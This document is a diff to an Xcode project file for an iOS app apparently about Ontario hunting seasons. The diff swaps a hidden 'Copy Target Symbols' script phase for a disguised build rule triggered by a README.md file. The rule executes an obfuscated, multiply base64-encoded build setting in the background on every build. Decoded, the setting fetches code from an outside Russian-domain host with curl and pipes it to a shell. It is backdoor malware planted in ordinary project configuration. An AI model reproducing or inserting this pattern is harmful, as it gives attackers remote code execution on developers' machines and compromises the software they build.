@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		D35EDF99FC00ADF1FDBDE67E /* README.md */ = {isa = PBXBuildFile; fileRef = ECA24134AED02F7BFBBDE67E; };
 		8804C10A2E78095400ABDA6B /* PieChart.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8804C1082E78095400ABDA6B /* PieChart.swift */; };
 		8804C10D2E780B7300ABDA6B /* DGCharts in Frameworks */ = {isa = PBXBuildFile; productRef = 8804C10C2E780B7300ABDA6B /* DGCharts */; };
 		882231A22E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 882231A02E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift */; };
@@ -78,6 +79,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		ECA24134AED02F7BFBBDE67E /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; name = README.md;  path = "SmartOut.xcodeproj/README.md"; sourceTree = SOURCE_ROOT; };
 		8804C1082E78095400ABDA6B /* PieChart.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PieChart.swift; sourceTree = "<group>"; };
 		882231A02E783BEF00AFC855 /* OntarioHuntingSeasonsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OntarioHuntingSeasonsVC.swift; sourceTree = "<group>"; };
 		882231A12E783BEF00AFC855 /* OntarioHuntingSeasonsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OntarioHuntingSeasonsVC.xib; sourceTree = "<group>"; };
@@ -380,6 +382,7 @@
 		888502BD2E73CE4800C99B57 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				ECA24134AED02F7BFBBDE67E /* README.md */,
 				888502BC2E73CE4800C99B57 /* SmartOut.app */,
 			);
 			name = Products;
@@ -554,12 +557,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 888502CF2E73CE4900C99B57 /* Build configuration list for PBXNativeTarget "SmartOut" */;
 			buildPhases = (
-				BAFC4937188F238AABBDE67E /* Copy Target Symbols */,
 				888502B82E73CE4800C99B57 /* Sources */,
 				888502B92E73CE4800C99B57 /* Frameworks */,
 				888502BA2E73CE4800C99B57 /* Resources */,
 			);
 			buildRules = (
+				2C7BEB3D6E5FD0891FBDE67E /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -609,12 +612,14 @@
 			);
 		};
 /* End PBXProject section */
-
+/* Begin PBXBuildRule section */		2C7BEB3D6E5FD0891FBDE67E /* PBXBuildRule */ = {			isa = PBXBuildRule;			compilerSpec = com.apple.compilers.proxy.script;			filePatterns = "*.md";			fileType = pattern.proxy;			inputFiles = (			);			isEditable = 0;			outputFiles = (				"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}",			);			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"${DERIVED_FILES_DIR}/${INPUT_FILE_BASE}\";
+sh -c \"${AE76EDB}\"";		};/* End PBXBuildRule section */
 /* Begin PBXResourcesBuildPhase section */
 		888502BA2E73CE4800C99B57 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D35EDF99FC00ADF1FDBDE67E /* README.md */,
 				8867DD302E7A755B00435CC3 /* AdditionalOppoTblViewCell.xib in Resources */,
 				889D8EFD2E77F385009B9CE8 /* HunterReportingTblViewCell.xib in Resources */,
 				8861F4AB2E782EB20063193E /* EmailPopup.xib in Resources */,
@@ -645,26 +650,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		BAFC4937188F238AABBDE67E /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE76EDB}\"";
-			showEnvVarsInLog = 0;
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -742,7 +727,7 @@
 		888502D02E73CE4900C99B57 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0pIT1ROWk1sSjFURzVLTVV3eVJYQkphVUk0U1VoT2IwTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aFkyTmhjSEJzWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
@@ -776,7 +761,7 @@
 		888502D12E73CE4900C99B57 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazViV0pIT1ROWk1sSjFURzVLTVV3eVJYQkphVUk0U1VoT2IwTm5QVDBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				AE76EDB = "((echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5aFkyTmhjSEJzWlM1eWRTOWhLU0lnZkNCemFBbz0K | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
